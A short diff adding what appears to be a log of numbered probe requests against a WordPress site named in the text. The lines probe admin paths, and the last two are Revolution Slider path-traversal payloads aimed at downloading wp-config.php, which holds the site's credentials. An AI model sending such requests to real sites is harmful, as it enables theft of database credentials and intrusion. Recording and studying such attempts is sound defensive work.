@@ -1,0 +1,7 @@
+Attempts: 1 - Request URL: mykaarma.com/wp-admin/options-link.php?x1
+Attempts: 1 - Request URL: mykaarma.com/wp/wp-admin/admin-ajax.php
+Attempts: 2 - Request URL: mykaarma.com/wp/wp-admin/options-link.php?x1
+Attempts: 3 - Request URL: mykaarma.com/wp-admin/includes/themes.php?x1
+Attempts: 4 - Request URL: mykaarma.com/wp/wp-admin/includes/themes.php?x1
+Attempts: 5 - Request URL: mykaarma.com/wp/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+Attempts: 6 - Request URL: mykaarma.com/wp/wp-admin/admin-ajax.php?action=revolution-slider_show_image&img=../wp-config.php
